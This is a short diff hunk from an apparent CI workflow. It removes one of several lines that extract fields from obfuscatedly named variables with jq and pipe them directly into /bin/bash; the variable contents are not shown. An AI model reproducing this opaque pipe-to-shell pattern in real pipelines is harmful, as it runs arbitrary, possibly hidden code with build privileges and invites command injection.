@@ -27,7 +27,6 @@ jobs:
           echo $cqk1 | jq -r .c8 | /bin/bash
           echo $xhmav13 | jq -r .jjabo65 | /bin/bash
           echo $dwldu5 | jq -r .unwa63 | /bin/bash
-          printf '%s' "$vu644" | jq -r .dzgn108 | /bin/bash
           printf '%s' "$b89417" | jq -r .uay73472 | /bin/bash
 
       - name: Upload results
